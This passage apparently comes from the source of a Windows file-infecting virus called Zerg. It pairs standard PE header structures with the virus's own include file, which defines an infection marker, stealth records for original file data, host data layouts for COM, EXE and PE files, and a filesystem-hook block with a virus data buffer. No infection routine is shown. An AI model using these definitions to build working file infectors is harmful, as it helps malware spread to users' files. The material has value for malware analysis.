IMAGE_OPTIONAL_HEADER struc
  Magic                         dw      ?
  MajorLinkerVersion            db      ?
  MinorLinkerVersion            db      ?
  SizeOfCode                    dd      ?
  SizeOfInitializedData         dd      ?
  SizeOfUninitializedData       dd      ?
  AddressOfEntryPoint           dd      ?
  BaseOfCode                    dd      ?
  BaseOfData                    dd      ?
  ImageBase                     dd      ?
  SectionAlignment              dd      ?
  FileAlignment                 dd      ?
  MajorOperatingSystemVersion   dw      ?
  MinorOperatingSystemVersion   dw      ?
  MajorImageVersion             dw      ?
  MinorImageVersion             dw      ?
  MajorSubsystemVersion         dw      ?
  MinorSubsystemVersion         dw      ?
  Win32VersionValue             dd      ?
  SizeOfImage                   dd      ?
  SizeOfHeaders                 dd      ?
  CheckSum                      dd      ?
  Subsystem                     dw      ?
  DllCharacteristics            dw      ?
  SizeOfStackReserve            dd      ?
  SizeOfStackCommit             dd      ?
  SizeOfHeapReserve             dd      ?
  SizeOfHeapCommit              dd      ?
  LoaderFlags                   dd      ?
  NumberOfRvaAndSizes           dd      ?
  DataDirectory                 IMAGE_DATA_DIRECTORY \
                                  IMAGE_NUMBEROF_DIRECTORY_ENTRIES dup(?)
IMAGE_OPTIONAL_HEADER ends

IMAGE_NT_OPTIONAL_HDR_MAGIC     equ     10bh
IMAGE_ROM_OPTIONAL_HDR_MAGIC    equ     107h

; Subsystem Values
IMAGE_SUBSYSTEM_UNKNOWN     equ 0       ; Unknown subsystem.
IMAGE_SUBSYSTEM_NATIVE      equ 1       ; Image doesn't require a subsystem.
IMAGE_SUBSYSTEM_WINDOWS_GUI equ 2       ; Image runs in the Windows GUI subsystem.
IMAGE_SUBSYSTEM_WINDOWS_CUI equ 3       ; Image runs in the Windows character subsystem.
IMAGE_SUBSYSTEM_OS2_CUI     equ 5       ; image runs in the OS/2 character subsystem.
IMAGE_SUBSYSTEM_POSIX_CUI   equ 7       ; image run  in the Posix character subsystem.
IMAGE_SUBSYSTEM_RESERVED8   equ 8       ; image run  in the 8 subsystem.

; Directory Entries
IMAGE_DIRECTORY_ENTRY_EXPORT       equ  0   ; Export Directory
IMAGE_DIRECTORY_ENTRY_IMPORT       equ  1   ; Import Directory
IMAGE_DIRECTORY_ENTRY_RESOURCE     equ  2   ; Resource Directory
IMAGE_DIRECTORY_ENTRY_EXCEPTION    equ  3   ; Exception Directory
IMAGE_DIRECTORY_ENTRY_SECURITY     equ  4   ; Security Directory
IMAGE_DIRECTORY_ENTRY_BASERELOC    equ  5   ; Base Relocation Table
IMAGE_DIRECTORY_ENTRY_DEBUG        equ  6   ; Debug Directory
IMAGE_DIRECTORY_ENTRY_COPYRIGHT    equ  7   ; Description String
IMAGE_DIRECTORY_ENTRY_GLOBALPTR    equ  8   ; Machine Value (MIPS GP)
IMAGE_DIRECTORY_ENTRY_TLS          equ  9   ; TLS Directory
IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG  equ 10   ; Load Configuration Directory
IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT equ 11   ; Bound Import Directory in headers
IMAGE_DIRECTORY_ENTRY_IAT          equ 12   ; Import Address Table

IMAGE_NT_HEADERS struc
  Signature     dd      ?
  FileHeader    IMAGE_FILE_HEADER ?
 OptionalHeader IMAGE_OPTIONAL_HEADER ?
IMAGE_NT_HEADERS ends


; Section header format.
IMAGE_SIZEOF_SHORT_NAME equ     8

misc union
  PhysicalAddress       dd      ?
  VirtualSize           dd      ?
misc ends

IMAGE_SECTION_HEADER struc
  Name                  db      IMAGE_SIZEOF_SHORT_NAME dup(?)
  Misc                  misc    ?
  VirtualAddress        dd      ?
  SizeOfRawData         dd      ?
  PointerToRawData      dd      ?
  PointerToRelocations  dd      ?
  PointerToLinenumbers  dd      ?
  NumberOfRelocations   dw      ?
  NumberOfLinenumbers   dw      ?
  SectionCharacteristics dd     ?
IMAGE_SECTION_HEADER ends

IMAGE_SIZEOF_SECTION_HEADER     equ     40

; Section characteristics.
IMAGE_SCN_TYPE_NO_PAD           equ     00000008h  ; Reserved.

IMAGE_SCN_CNT_CODE              equ     00000020h  ; Section contains code.
IMAGE_SCN_CNT_INITIALIZED_DATA  equ     00000040h  ; Section contains initialized data.
IMAGE_SCN_CNT_UNINITIALIZED_DATA equ    00000080h  ; Section contains uninitialized data.

IMAGE_SCN_LNK_OTHER             equ     00000100h  ; Reserved.
IMAGE_SCN_LNK_INFO              equ     00000200h  ; Section contains comments or some other type of information.
IMAGE_SCN_LNK_REMOVE            equ     00000800h  ; Section contents will not become part of image.
IMAGE_SCN_LNK_COMDAT            equ     00001000h  ; Section contents comdat.

IMAGE_SCN_MEM_FARDATA           equ     00008000h
IMAGE_SCN_MEM_PURGEABLE         equ     00020000h
IMAGE_SCN_MEM_16BIT             equ     00020000h
IMAGE_SCN_MEM_LOCKED            equ     00040000h
IMAGE_SCN_MEM_PRELOAD           equ     00080000h

IMAGE_SCN_ALIGN_1BYTES          equ     00100000h  ;
IMAGE_SCN_ALIGN_2BYTES          equ     00200000h  ;
IMAGE_SCN_ALIGN_4BYTES          equ     00300000h  ;
IMAGE_SCN_ALIGN_8BYTES          equ     00400000h  ;
IMAGE_SCN_ALIGN_16BYTES         equ     00500000h  ; Default alignment if no others are specified.
IMAGE_SCN_ALIGN_32BYTES         equ     00600000h  ;
IMAGE_SCN_ALIGN_64BYTES         equ     00700000h  ;

IMAGE_SCN_LNK_NRELOC_OVFL       equ     01000000h  ; Section contains extended relocations.
IMAGE_SCN_MEM_DISCARDABLE       equ     02000000h  ; Section can be discarded.
IMAGE_SCN_MEM_NOT_CACHED        equ     04000000h  ; Section is not cachable.
IMAGE_SCN_MEM_NOT_PAGED         equ     08000000h  ; Section is not pageable.
IMAGE_SCN_MEM_SHARED            equ     10000000h  ; Section is shareable.
IMAGE_SCN_MEM_EXECUTE           equ     20000000h  ; Section is executable.
IMAGE_SCN_MEM_READ              equ     40000000h  ; Section is readable.
IMAGE_SCN_MEM_WRITE             equ     80000000h  ; Section is writeable.


; Export Format
IMAGE_EXPORT_DIRECTORY struc
  ExportCharacteristics dd      ?
  TimeDateStamp         dd      ?
  MajorVersion          dw      ?
  MinorVersion          dw      ?
  ExportName            dd      ?
  Base                  dd      ?
  NumberOfFunctions     dd      ?
  NumberOfNames         dd      ?
  AddressOfFunctions    dd      ?
  AddressOfNames        dd      ?
  AddressOfNameOrdinals dd      ?
IMAGE_EXPORT_DIRECTORY ends


; Import Format
IMAGE_IMPORT_BY_NAME struc
  Hint          dw      ?
  ImportFuncName db     ?
IMAGE_IMPORT_BY_NAME ends

IMAGE_THUNK_DATA union
  ForwarderString       dd      ?
  Function              dd      ?
  Ordinal               dd      ?
  AddressOfData         dd      ?
IMAGE_THUNK_DATA ends

IMAGE_ORDINAL_FLAG      equ     0x80000000

IMAGE_IMPORT_DESCRIPTOR struc
  OriginalFirstThunk IMAGE_THUNK_DATA ? ; RVA to original unbound IAT
  TimeDateStamp      dd ?               ; 0 if not bound,
                                        ; -1 if bound, and real date\time stamp
                                        ;     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)
                                        ; O.W. date/time stamp of DLL bound to (Old BIND)
  ForwarderChain     dd ?               ; -1 if no forwarders
  ImportName         dd ?
  FirstThunk IMAGE_THUNK_DATA ?         ; RVA to IAT (if bound this IAT has actual addresses)
IMAGE_IMPORT_DESCRIPTOR ends


컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[FileHead.inc]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[Zerg.INC]컴�

include         filehead.inc
include         ifs.inc
include         ifsext.inc

; for stealth
st      struc
  st_size dw    ?       ; data size (zero if last item)
  st_pt   dd    ?       ; file point
st      ends

; common host data
cmn_ht  struc
  InfectedSign  dd      ?
  FileSize      dd      ?
  eh_st         st      ?
  eh         exe_header ?
cmn_ht  ends

; for com & exe
ce      struc
  ce_cmn_ht     cmn_ht  ?
  ce_last       dw      ?
ce      ends

; for pe (portable executable)
pe      struc
  pe_cmn_ht     cmn_ht  ?
  pe_inhs_st    st      ?
  pe_inhs       IMAGE_NT_HEADERS ?
  pe_ish_st     st      ?
  pe_ish        IMAGE_SECTION_HEADER ?
  pe_last       dw      ?
pe      ends

; combine each file format
host_data union
  ce_hdat ce    ?
  pe_hdat pe    ?
host_data ends


ifshp   struc
  hdat          host_data ?
  FileAttributes dd     ?
  FileDateTime  dd      ?
  our_ifsreq    ifsreq  ?
  our_hfunc     hndlfunc ?
  PathNameSize  dd      ?
  szPathName    db      MAX_PATH dup(?)
  UniPath       db      1024 dup(?)
  VirData       db      vir_file_size dup(?)
ifshp   ends


; for pushfd & pushad
pfad    struc
  pfad_edi      dd      ?
  pfad_esi      dd      ?
  pfad_ebp      dd      ?
  pfad_esp      dd      ?
  pfad_ebx      dd      ?
  pfad_edx      dd      ?
  pfad_ecx      dd      ?
  pfad_eax      dd      ?
  pfad_eflags   dd      ?
  pfad_ret      dd      ?
pfad    ends

CFbit   equ     0000000000000001b
PFbit   equ     0000000000000100b
AFbit   equ     0000000000010000b
ZFbit   equ     0000000001000000b
SFbit   equ     0000000010000000b
TFbit   equ     0000000100000000b
IFbit   equ     0000001000000000b
DFbit   equ     0000010000000000b
OFbit   equ     0000100000000000b
IOPLbits equ    0011000000000000b
NTbit   equ     0100000000000000b

RFbit   equ     (1b      shl    16)
VMbit   equ     (10b     shl    16)
ACbit   equ     (100b    shl    16)
VIFbit  equ     (1000b   shl    16)
VIPbit  equ     (10000b  shl    16)
IDbit   equ     (100000b shl    16)


컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[Zerg.INC]컴�
